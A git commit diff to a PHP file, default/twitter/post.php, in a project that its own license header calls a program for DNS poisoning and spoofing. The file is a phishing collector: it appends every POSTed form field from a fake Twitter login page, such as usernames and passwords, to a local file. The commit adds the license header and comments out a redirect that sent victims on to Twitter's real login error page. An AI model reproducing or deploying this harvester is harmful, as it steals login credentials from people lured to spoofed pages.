dee00f4292de6f8e5a7db839bda89c7f3e2f2382
mak <makindosx@gmail.com>
2019-11-10 18:39:03 +0200

    Add files via upload

--- default/twitter/post.php
+++ default/twitter/post.php
@@ -1,5 +1,24 @@
 <?php 
 
+/*
+*  Copyright (c) 2019 Barchampas Gerasimos <makindosx@gmail.com>.
+*  proxior is a program for poisoning and spoofing dns.
+*
+*  proxior is free software: you can redistribute it and/or modify
+*  it under the terms of the GNU Affero General Public License as published by
+*  the Free Software Foundation, either version 3 of the License, or
+*  (at your option) any later version.
+*
+*  proxior is distributed in the hope that it will be useful,
+*  but WITHOUT ANY WARRANTY; without even the implied warranty of
+*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+*  GNU Affero General Public License for more details.
+*
+*  You should have received a copy of the GNU Affero General Public License
+*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
+*
+*/
+
 $path = getcwd();
 
 $path = substr($path,0,17);
@@ -9,4 +28,4 @@ file_put_contents($file, print_r($_POST, true), FILE_APPEND);
 
 ?>
 
-<meta http-equiv="refresh" content="0; url=https://twitter.com/login/error?username_or_email=&redirect_after_login=%2F%3Flang%3Del" />
+<!-- <meta http-equiv="refresh" content="0; url=https://twitter.com/login/error?username_or_email=&redirect_after_login=%2F%3Flang%3Del" /> -->
